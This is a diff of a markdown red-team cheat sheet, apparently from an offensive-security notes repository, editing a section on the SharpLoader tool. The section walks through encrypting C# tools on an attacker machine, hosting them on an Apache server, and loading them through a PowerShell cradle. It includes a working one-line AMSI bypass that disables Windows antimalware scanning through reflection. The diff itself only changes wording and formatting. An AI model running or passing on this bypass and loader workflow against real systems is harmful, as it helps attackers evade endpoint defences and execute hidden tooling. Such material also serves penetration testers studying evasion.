@@ -532,14 +532,14 @@ IntPtr.Zero, 0, IntPtr.Zero);
 ## SharpLoader
 [Sharploader]('https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader')
 
-- First, encrypt all your csharp files using invoke-sharpEncrypt.
-- Second, Places all your encrypted files on your apache server.
-- Third, Create a powershell script using the amsi string below.
-- Fourth, Run the amsi script before running invoke-sharploader.
+- First, encrypt all your csharp files on the attacker machine using invoke-sharpencrypt.
+- Second, places all your encrypted files on your apache server.
+- Third, create a powershell script using the amsi string below.
+- Fourth, Run the amsi script inside the powershell cradle. Finally, Run Invoke-sharploader inside a powershell cradle.
 
 <br>
 
-### 1&2
+### 1/2
 
 ```csharp
 Invoke-SharpEncrypt -file C:\Path\to\file.exe -password SuperDumperStrongPassword -outfile C:\Path\to\file.enc
@@ -550,7 +550,7 @@ Invoke-SharpEncrypt -file C:\Path\to\file.exe -password SuperDumperStrongPasswor
 
 ```powershell
 (([Ref].Assembly.gettypes() | ? {$_.Name -like "Amsi*utils"}).GetFields("NonPublic,Static") | ? {$_.Name -like "amsiInit*ailed"}).SetValue($null,$true)
-````
+```
 <br>
 
 ### 3
